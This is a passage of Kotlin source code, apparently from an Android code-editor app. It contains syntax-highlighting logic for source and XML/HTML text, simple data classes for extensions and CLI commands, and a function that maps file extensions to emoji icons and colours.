                    }
                    
                    // Strings
                    if (char == '"' || char == '\'' || char == '`') {
                        val endChar = char
                        val startPos = pos
                        pos++
                        while (pos < length && line[pos] != endChar) {
                            pos++
                        }
                        if (pos < length) pos++ // include matching quote
                        val stringVal = line.substring(startPos, pos)
                        withStyle(style = SpanStyle(color = AmberYellow)) {
                            append(stringVal)
                        }
                        continue
                    }
 
                    // Numeric identifiers
                    if (char.isDigit()) {
                        val startPos = pos
                        while (pos < length && line[pos].isDigit()) {
                            pos++
                        }
                        withStyle(style = SpanStyle(color = CyanBlue)) {
                            append(line.substring(startPos, pos))
                        }
                        continue
                    }

                    // Alphabetic identifiers or keywords
                    if (char.isLetter() || char == '_') {
                        val startPos = pos
                        while (pos < length && (line[pos].isLetterOrDigit() || line[pos] == '_')) {
                            pos++
                        }
                        val word = line.substring(startPos, pos)
                        if (keywords.contains(word)) {
                            withStyle(style = SpanStyle(color = NeonGreen, fontWeight = FontWeight.Bold)) {
                                append(word)
                            }
                        } else if (pos < length && line[pos] == '(') {
                            // Function invocation
                            withStyle(style = SpanStyle(color = ElectricLime)) {
                                append(word)
                            }
                        } else {
                            val normalColor = if (extension == "json") AmberYellow else TextGreen
                            withStyle(style = SpanStyle(color = normalColor)) {
                                append(word)
                            }
                        }
                        continue
                    }
 
                    // Miscellaneous characters
                    append(char)
                    pos++
                }
                if (lineIdx < lines.size - 1) append("\n")
            }
        } else if (extension == "xml" || extension == "html" || extension == "htm") {
            // XML/HTML styling highlights
            val tagPattern = Pattern.compile("(<[^>]+>)")
            val matcher = tagPattern.matcher(code)
            var lastIdx = 0
            while (matcher.find()) {
                val start = matcher.start()
                val end = matcher.end()
                
                // Append text before match
                append(code.substring(lastIdx, start))
                
                val tagText = matcher.group(1) ?: ""
                withStyle(style = SpanStyle(color = NeonGreen)) {
                    append(tagText)
                }
                lastIdx = end
            }
            if (lastIdx < code.length) {
                append(code.substring(lastIdx))
            }
        } else {
            // General Plain text standard highlighting
            append(code)
        }
    }
}

data class ExtensionItem(
    val id: String,
    val name: String,
    val description: String,
    val version: String,
    val author: String,
    val category: String
)

data class CliCommandItem(
    val command: String,
    val category: String,
    val description: String
)

fun getFileIconAndColor(fileName: String, isIconsPackInstalled: Boolean): Pair<String, Color> {
    val ext = fileName.substringAfterLast(".").lowercase()
    if (!isIconsPackInstalled) {
        return Pair("📄", Color(0xFF81C784)) // Default GhostGreen-ish color
    }
    return when (ext) {
        "py", "pyw", "ipynb" -> Pair("🐍", Color(0xFF3776AB))
        "html", "htm" -> Pair("🌐", Color(0xFFE34F26))
        "css", "less", "sass", "scss" -> Pair("🎨", Color(0xFF1572B6))
        "js", "jsx" -> Pair("⚡", Color(0xFFF7DF1E))
        "ts", "tsx" -> Pair("🟦", Color(0xFF3178C6))
        "json" -> Pair("⚙️", Color(0xFF8BC34A))
        "xml", "svg" -> Pair("📦", Color(0xFFFF5722))
        "kt", "kts" -> Pair("🎯", Color(0xFF7F52FF))
        "java", "class", "jar" -> Pair("☕", Color(0xFFED8B00))
        "sh", "bash", "zsh" -> Pair("🐚", Color(0xFF4EAA25))
        "sql", "db", "sqlite" -> Pair("🗄️", Color(0xFF4479A1))
        "md", "txt" -> Pair("📝", Color(0xFF90A4AE))
        "yaml", "yml", "toml", "ini", "conf", "env" -> Pair("🔧", Color(0xFFFFC107))
        "cpp", "hpp", "c", "h" -> Pair("👾", Color(0xFF00599C))
        "cs" -> Pair("🔮", Color(0xFF178600))
        "go" -> Pair("🐹", Color(0xFF00ADD8))
        "rs" -> Pair("🦀", Color(0xFFCE412B))
        "swift" -> Pair("🍎", Color(0xFFFA7343))
        "php" -> Pair("🐘", Color(0xFF777BB4))
        "rb" -> Pair("💎", Color(0xFFCC342D))
        "lua" -> Pair("🌙", Color(0xFF000080))
        "png", "jpg", "jpeg", "gif", "webp", "ico" -> Pair("🖼️", Color(0xFFE91E63))
        "mp3", "wav", "ogg", "flac" -> Pair("🎵", Color(0xFF9C27B0))
        "mp4", "avi", "mkv" -> Pair("🎬", Color(0xFF673AB7))
        "zip", "tar", "gz", "rar", "7z" -> Pair("📚", Color(0xFF795548))
        else -> Pair("📄", Color(0xFF81C784))
    }
}
